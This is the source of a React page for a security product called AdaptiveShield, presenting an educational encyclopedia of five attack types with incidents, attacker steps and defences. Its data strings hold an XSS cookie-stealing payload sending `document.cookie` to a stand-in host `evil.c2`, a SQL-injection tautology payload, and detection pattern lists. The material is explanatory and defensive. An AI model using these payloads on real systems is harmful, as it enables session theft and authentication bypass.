import React, { useState } from 'react';
import {
  Flame, Database, Code, Share2, Lock, Mail, Shield,
  ShieldAlert, ShieldCheck, ChevronDown, ChevronUp,
  AlertTriangle, Target, ArrowRight, BookOpen, Cpu, Users, Server
} from 'lucide-react';

const SEVERITY_COLORS = {
  CRITICAL: 'bg-rose-500/15 border-rose-500/40 text-rose-400',
  HIGH:     'bg-amber-500/15 border-amber-500/40 text-amber-400',
  MEDIUM:   'bg-blue-500/15 border-blue-500/40 text-blue-400',
};

const ATTACKS = [
  {
    id: 'ddos',
    title: 'DDoS (Distributed Denial of Service)',
    shortName: 'DDoS Flood',
    icon: Flame,
    severity: 'CRITICAL',
    color: 'rose',
    category: 'Volumetric / Availability',
    cveRef: 'CWE-400: Uncontrolled Resource Consumption',
    impact: 'Service unavailability, revenue loss, SLA breach, infrastructure saturation.',
    realWorld: 'Mirai Botnet (2016) took down Dyn DNS — knocking GitHub, Twitter, Netflix offline for hours. Attack peaked at 1.2 Tbps.',
    howItWorks: [
      { label: 'Weaponization', desc: 'Attacker infects thousands of IoT devices (cameras, routers, DVRs) with C2 malware to form a botnet.' },
      { label: 'Coordination', desc: 'C2 server issues flood command — bots simultaneously blast SYN, UDP, or HTTP floods at the target IP.' },
      { label: 'Resource Exhaustion', desc: 'Target network buffers, CPU workers, and connection tables saturate to 100% capacity.' },
      { label: 'Outage', desc: 'Legitimate user requests timeout or receive HTTP 503/504 as the server collapses under synthetic load.' },
    ],
    adaptiveDefense: 'Sliding-window rate limiter (Stage 3) blocks IP bursts exceeding 8 req/4 s. Adaptive auto-ban (Stage 5) quarantines repeat offenders. SYN cookies and anycast BGP scrubbing absorb volumetric floods upstream.',
    defenseStatus: 'ACTIVE',
  },
  {
    id: 'sqli',
    title: 'SQL Injection (SQLi)',
    shortName: 'SQL Injection',
    icon: Database,
    severity: 'CRITICAL',
    color: 'purple',
    category: 'Injection / Data Exfiltration',
    cveRef: 'CWE-89: SQL Command Injection',
    impact: 'Complete database compromise, mass PII exfiltration, unauthorized record manipulation, auth bypass.',
    realWorld: 'Heartland Payment Systems (2008) — SQLi attackers stole 130 million credit card numbers in the largest breach at the time.',
    howItWorks: [
      { label: 'Payload Crafting', desc: "Attacker crafts a boolean tautology: `admin' OR '1'='1' --` to always evaluate as TRUE." },
      { label: 'Unsanitized Concatenation', desc: "Vulnerable backend code concatenates raw input directly: `SELECT * FROM users WHERE username = '` + input + `'`." },
      { label: 'Auth Bypass', desc: "SQL engine evaluates `WHERE username = '' OR '1'='1'` — TRUE for all rows — authenticating attacker without a valid password." },
      { label: 'Exfiltration', desc: 'Attacker escalates with UNION SELECT to dump tables, extract usernames, hashed passwords, and credit card data.' },
    ],
    adaptiveDefense: 'Stage 4 Deep Payload DPI (SIG-SQLI) matches UNION/SELECT/INSERT patterns and tautology syntax. Custom REGEX rules let operators add organization-specific signatures. WAF-style input sanitization strips hazardous tokens before reaching the database layer.',
    defenseStatus: 'ACTIVE',
  },
  {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS)',
    shortName: 'XSS Scripting',
    icon: Code,
    severity: 'HIGH',
    color: 'sky',
    category: 'Injection / Client Execution',
    cveRef: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    impact: 'Session theft, account takeover, DOM manipulation, credential keylogging, phishing in trusted context.',
    realWorld: 'British Airways (2018) — XSS on the payment page exfiltrated 500,000 customers\' financial details. £20M GDPR fine.',
    howItWorks: [
      { label: 'Payload Submission', desc: 'Attacker posts `<script>fetch("https://evil.c2/steal?c="+document.cookie)</script>` into a comment or profile field.' },
      { label: 'Storage Without Encoding', desc: "Server stores the raw payload in the database without HTML entity encoding (e.g., `&lt;script&gt;`)." },
      { label: 'Victim Page Load', desc: "When other users load the page, the browser renders the unencoded payload as live JavaScript and executes it." },
      { label: 'Exfiltration', desc: 'Session cookies, auth tokens, and keystrokes are silently sent to the attacker\'s C2 server in the background.' },
    ],
    adaptiveDefense: 'Stage 4 regex (SIG-XSS) matches `<script>`, `javascript:`, `onload=`, `eval(` patterns. Content Security Policy (CSP) headers block inline script execution even if payload reaches the browser. `HttpOnly` and `Secure` cookie flags prevent JS-readable session tokens.',
    defenseStatus: 'ACTIVE',
  },
  {
    id: 'bruteforce',
    title: 'Brute Force Credential Attacks',
    shortName: 'Brute Force',
    icon: Target,
    severity: 'HIGH',
    color: 'amber',
    category: 'Authentication Abuse',
    cveRef: 'CWE-307: Improper Restriction of Excessive Authentication Attempts',
    impact: 'Unauthorized account access, administrative privilege escalation, data theft, lateral movement.',
    realWorld: 'Alibaba (2016) — attackers used a credential-stuffed list of 99 million accounts and brute-forced 20.59 million successful logins.',
    howItWorks: [
      { label: 'Credential List Assembly', desc: 'Attacker acquires password dumps from past breaches (RockYou, LinkedIn) or generates permutations: admin/admin, root/123456.' },
      { label: 'Automated Spraying', desc: 'Tools like Hydra or Burp Intruder send thousands of POST requests per second to /login with different credential pairs.' },
      { label: 'Rate-Unaware Backend', desc: 'Without account lockout or rate limiting, the server obediently checks each credential against the auth database.' },
      { label: 'Successful Compromise', desc: 'On credential match, attacker lands an authenticated session, exfiltrates data, or pivots to admin panels.' },
    ],
    adaptiveDefense: 'Stage 3 sliding-window rate limiter blocks IPs exceeding 8 requests per 4 seconds — the critical threshold for automated tools. Stage 4 SIG-BRUTE matches known brute-pattern payloads (admin:admin, hydra user-agents). Stage 5 auto-bans the IP after accumulated risk score breach.',
    defenseStatus: 'ACTIVE',
  },
  {
    id: 'mitm',
    title: 'Man-in-the-Middle (MitM)',
    shortName: 'MitM Proxy',
    icon: Share2,
    severity: 'HIGH',
    color: 'blue',
    category: 'Interception / Tampering',
    cveRef: 'CWE-300: Channel Accessible by Non-Endpoint',
    impact: 'Session hijacking, financial transaction tampering, corporate espionage, credential interception.',
    realWorld: 'Nokia (2013) — secretly decrypted HTTPS traffic from mobile subscribers on its proxy infrastructure for "optimization."',
    howItWorks: [
      { label: 'Network Positioning', desc: 'Attacker executes ARP spoofing, rogue Wi-Fi AP, or DNS cache poisoning to route victim traffic through their machine.' },
      { label: 'TLS Downgrade', desc: 'Attacker performs SSL stripping — converting HTTPS to HTTP — or presents a forged TLS certificate to the victim.' },
      { label: 'Passive Interception', desc: 'All HTTP payloads, form submissions, cookies, and session tokens are logged in plaintext by the attacker.' },
      { label: 'Active Injection', desc: 'Attacker modifies packets in flight — changing bank transfer amounts, inserting malicious JS, or altering API responses.' },
    ],
    adaptiveDefense: 'HSTS (HTTP Strict Transport Security) forces TLS 1.3 upgrades and prevents downgrade attacks. Certificate pinning rejects forged CA certs. AdaptiveShield blocks cleartext protocols (Telnet/Stage 1 protocol rules) and flags abnormal traffic routing. IEEE 802.1X port authentication stops rogue devices.',
    defenseStatus: 'MONITORED',
  },
];

const severityRating = {
  CRITICAL: { stars: 5, label: 'CRITICAL — Immediate Business Impact' },
  HIGH:     { stars: 4, label: 'HIGH — Serious Data or Session Risk' },
  MEDIUM:   { stars: 3, label: 'MEDIUM — Targeted Exploitation Required' },
};

const colorSchemes = {
  rose:   { border: 'border-rose-500/30',   bg: 'bg-rose-500/8',   icon: 'bg-rose-600/15 text-rose-400',   badge: 'bg-rose-500/15 text-rose-400 border-rose-500/40',   bar: 'bg-rose-500',   header: 'from-rose-950/60' },
  purple: { border: 'border-purple-500/30', bg: 'bg-purple-500/8', icon: 'bg-purple-600/15 text-purple-400', badge: 'bg-purple-500/15 text-purple-400 border-purple-500/40', bar: 'bg-purple-500', header: 'from-purple-950/60' },
  sky:    { border: 'border-sky-500/30',    bg: 'bg-sky-500/8',    icon: 'bg-sky-600/15 text-sky-400',    badge: 'bg-sky-500/15 text-sky-400 border-sky-500/40',    bar: 'bg-sky-500',    header: 'from-sky-950/60' },
  amber:  { border: 'border-amber-500/30',  bg: 'bg-amber-500/8',  icon: 'bg-amber-600/15 text-amber-400',  badge: 'bg-amber-500/15 text-amber-400 border-amber-500/40',  bar: 'bg-amber-500',  header: 'from-amber-950/60' },
  blue:   { border: 'border-blue-500/30',   bg: 'bg-blue-500/8',   icon: 'bg-blue-600/15 text-blue-400',   badge: 'bg-blue-500/15 text-blue-400 border-blue-500/40',   bar: 'bg-blue-500',   header: 'from-blue-950/60' },
};

function AttackCard({ attack }) {
  const [open, setOpen] = useState(false);
  const c = colorSchemes[attack.color];
  const sev = severityRating[attack.severity];
  const Icon = attack.icon;

  return (
    <div className={`rounded-3xl border ${c.border} ${c.bg} overflow-hidden transition-all duration-200`}>
      {/* Card Header */}
      <button
        onClick={() => setOpen(o => !o)}
        className={`w-full text-left p-5 sm:p-6 flex items-start gap-4 group cursor-pointer bg-gradient-to-r ${c.header} to-transparent`}
      >
        <div className={`w-12 h-12 rounded-2xl ${c.icon} flex items-center justify-center shrink-0`}>
          <Icon className="w-6 h-6" />
        </div>

        <div className="flex-1 min-w-0 space-y-1.5">
          <div className="flex flex-wrap items-center gap-2">
            <h3 className="text-base sm:text-lg font-bold text-white">{attack.title}</h3>
            <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded-full border ${SEVERITY_COLORS[attack.severity]}`}>
              {attack.severity}
            </span>
            <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full border ${c.badge}`}>
              {attack.defenseStatus}
            </span>
          </div>
          <p className="text-xs text-slate-400 font-mono">{attack.category} · {attack.cveRef}</p>

          {/* Impact preview */}
          <div className="flex items-center gap-1.5 pt-0.5">
            {Array.from({ length: 5 }).map((_, i) => (
              <div
                key={i}
                className={`h-1.5 w-6 rounded-full ${i < sev.stars ? c.bar : 'bg-slate-800'}`}
              />
            ))}
            <span className="text-[9px] text-slate-500 font-mono ml-1">{sev.label}</span>
          </div>
        </div>

        <div className="shrink-0 mt-1 text-slate-500 group-hover:text-slate-300 transition-colors">
          {open ? <ChevronUp className="w-5 h-5" /> : <ChevronDown className="w-5 h-5" />}
        </div>
      </button>

      {/* Expanded Content */}
      {open && (
        <div className="px-5 sm:px-6 pb-6 space-y-6 border-t border-slate-800/60">
          {/* Real-world example */}
          <div className="mt-5 p-4 rounded-2xl bg-slate-900/60 border border-slate-800 space-y-1">
            <div className="flex items-center gap-2 text-xs font-mono font-bold text-slate-400 uppercase tracking-wider">
              <AlertTriangle className="w-3.5 h-3.5 text-amber-400" />
              Real-World Incident
            </div>
            <p className="text-sm text-slate-300 leading-relaxed">{attack.realWorld}</p>
          </div>

          {/* Attacker methodology */}
          <div className="space-y-3">
            <h4 className="text-xs font-mono font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
              <Target className="w-3.5 h-3.5 text-rose-400" />
              Attacker Methodology — Step by Step
            </h4>
            <div className="space-y-2.5">
              {attack.howItWorks.map((step, i) => (
                <div key={i} className="flex items-start gap-3">
                  <div className="flex items-center justify-center w-6 h-6 rounded-lg bg-slate-800 border border-slate-700 text-[10px] font-mono font-bold text-slate-400 shrink-0 mt-0.5">
                    {String(i + 1).padStart(2, '0')}
                  </div>
                  <div>
                    <span className="text-xs font-bold text-white">{step.label}: </span>
                    <span className="text-xs text-slate-400 leading-relaxed">{step.desc}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Impact */}
          <div className="p-4 rounded-2xl bg-rose-950/20 border border-rose-500/20 space-y-1.5">
            <div className="flex items-center gap-2 text-xs font-mono font-bold text-rose-400 uppercase tracking-wider">
              <ShieldAlert className="w-3.5 h-3.5" />
              Business Impact
            </div>
            <p className="text-sm text-slate-300">{attack.impact}</p>
          </div>

          {/* Defense */}
          <div className="p-4 rounded-2xl bg-blue-950/20 border border-blue-500/20 space-y-1.5">
            <div className="flex items-center gap-2 text-xs font-mono font-bold text-blue-400 uppercase tracking-wider">
              <ShieldCheck className="w-3.5 h-3.5" />
              AdaptiveShield Defense Mechanism
            </div>
            <p className="text-sm text-slate-300 leading-relaxed">{attack.adaptiveDefense}</p>
          </div>
        </div>
      )}
    </div>
  );
}

export default function KnowledgeBasePage() {
  const [filter, setFilter] = useState('ALL');
  const filtered = filter === 'ALL' ? ATTACKS : ATTACKS.filter(a => a.severity === filter);

  return (
    <div className="px-4 sm:px-6 lg:px-12 py-12 max-w-[1400px] mx-auto space-y-12">
      {/* Page Header */}
      <div className="text-center max-w-3xl mx-auto space-y-4">
        <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-amber-600/10 border border-amber-500/30 text-amber-400 text-xs font-mono font-semibold tracking-widest">
          <BookOpen className="w-3.5 h-3.5" />
          ATTACK ENCYCLOPEDIA · EDUCATIONAL REFERENCE
        </div>
        <h1 className="text-3xl sm:text-5xl font-extrabold tracking-tight text-white">
          How Bad Actors{' '}
          <span className="bg-gradient-to-r from-rose-400 via-amber-300 to-orange-400 bg-clip-text text-transparent">
            Attack Systems
          </span>
        </h1>
        <p className="text-slate-400 text-sm sm:text-base leading-relaxed">
          A comprehensive, step-by-step breakdown of every attack vector AdaptiveShield defends against —
          including real-world incidents, attacker workflows, severity ratings, and exact mitigation strategies.
        </p>
      </div>

      {/* Quick Stats Bar */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 max-w-3xl mx-auto">
        {[
          { label: 'Attack Classes', value: ATTACKS.length, icon: ShieldAlert, color: 'text-rose-400' },
          { label: 'Critical Severity', value: ATTACKS.filter(a => a.severity === 'CRITICAL').length, icon: Flame, color: 'text-rose-500' },
          { label: 'All Actively Mitigated', value: '100%', icon: ShieldCheck, color: 'text-emerald-400' },
          { label: 'Pipeline Stages Used', value: 5, icon: Cpu, color: 'text-blue-400' },
        ].map(({ label, value, icon: Icon, color }) => (
          <div key={label} className="p-3.5 rounded-2xl bg-slate-900/80 border border-slate-800 text-center">
            <Icon className={`w-5 h-5 mx-auto mb-1.5 ${color}`} />
            <div className={`text-xl font-bold font-mono ${color}`}>{value}</div>
            <div className="text-[10px] text-slate-500 font-mono">{label}</div>
          </div>
        ))}
      </div>

      {/* Severity Filter */}
      <div className="flex flex-wrap gap-2 justify-center">
        {['ALL', 'CRITICAL', 'HIGH', 'MEDIUM'].map(f => (
          <button
            key={f}
            onClick={() => setFilter(f)}
            className={`px-4 py-1.5 rounded-xl text-xs font-mono font-bold transition-all duration-200 cursor-pointer border ${
              filter === f
                ? 'bg-blue-600 text-white border-blue-500 shadow-md shadow-blue-600/20'
                : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white hover:border-slate-600'
            }`}
          >
            {f === 'ALL' ? `All Attacks (${ATTACKS.length})` : `${f} (${ATTACKS.filter(a => a.severity === f).length})`}
          </button>
        ))}
      </div>

      {/* Attack Cards */}
      <div className="space-y-4">
        {filtered.map(attack => (
          <AttackCard key={attack.id} attack={attack} />
        ))}
      </div>

      {/* How AdaptiveShield Works Cross-Reference */}
      <div className="rounded-3xl bg-gradient-to-br from-blue-950/60 to-slate-950 border border-blue-500/20 p-6 sm:p-8 space-y-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-2xl bg-blue-600/20 text-blue-400 flex items-center justify-center">
            <Shield className="w-5 h-5" />
          </div>
          <div>
            <h3 className="text-lg font-bold text-white">All Attacks — One Unified Engine</h3>
            <p className="text-xs text-slate-400">Every attack above is mitigated by a specific pipeline stage</p>
          </div>
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-5 gap-3">
          {[
            { stage: 'S1', name: 'IP Access List', covers: 'Blacklisted C2 nodes', icon: Server },
            { stage: 'S2', name: 'Port Guard', covers: 'Ransomware lateral ports', icon: Lock },
            { stage: 'S3', name: 'Rate Limiter', covers: 'DDoS + Brute Force', icon: Flame },
            { stage: 'S4', name: 'Payload DPI', covers: 'SQLi, XSS, CMDI', icon: Code },
            { stage: 'S5', name: 'Auto-Ban', covers: 'Persistent adversaries', icon: ShieldAlert },
          ].map(({ stage, name, covers, icon: Icon }) => (
            <div key={stage} className="p-3 rounded-2xl bg-slate-900/60 border border-blue-500/20 text-center space-y-1.5">
              <span className="text-[9px] font-mono font-bold text-blue-400">{stage}</span>
              <Icon className="w-5 h-5 mx-auto text-blue-300" />
              <div className="text-xs font-bold text-white">{name}</div>
              <div className="text-[10px] text-slate-400">{covers}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
